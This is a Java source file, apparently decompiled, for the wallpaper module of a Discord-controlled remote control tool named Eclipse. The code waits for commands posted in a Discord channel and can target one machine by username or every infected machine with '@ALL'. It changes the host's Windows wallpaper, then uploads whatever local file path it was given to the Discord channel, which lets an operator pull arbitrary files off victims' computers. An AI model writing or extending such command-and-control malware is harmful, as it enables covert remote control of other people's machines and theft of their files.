package me.Eclipse.Modules.Impl;

import java.awt.Color;
import java.io.File;

import me.Eclipse.Brain;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.utils.AttachmentOption;

public class WallpaperModule {
    public static void run(MessageReceivedEvent var0) {
        MessageChannel var1 = var0.getChannel();
        Message var2 = var0.getMessage();
        if (var2.getChannel().getName().contains("module-wallpaper")) {
            if (var2.getContentDisplay().startsWith("!Wallpaper " + Brain.Username) || var2.getContentDisplay().startsWith("!Wallpaper @ALL")) {
                String var3 = var2.getContentDisplay().replaceFirst("!Wallpaper " + Brain.Username + " ", "").replaceFirst("!Wallpaper @ALL ", "");
                if ((new File(var3)).exists()) {
                    try {
                        Helper.User32.INSTANCE.SystemParametersInfo(20, 0, var3, 1);
                        Helper.sendMessage(Color.GREEN, "Module Wallpaper (" + Brain.Username + ")", "Wallpaper has been successfully changed to:", var0);
                        var1.sendFile(new File(var3), new AttachmentOption[0]).queue();
                    } catch (ClassFormatError var5) {
                        Helper.sendMessage(Color.RED, "Module Wallpaper (" + Brain.Username + ")", "Failed to load wallpaper.", var0);
                    }
                } else {
                    Helper.sendMessage(Color.RED, "Module Wallpaper (" + Brain.Username + ")", "File not found.", var0);
                }
            }

        }
    }
}
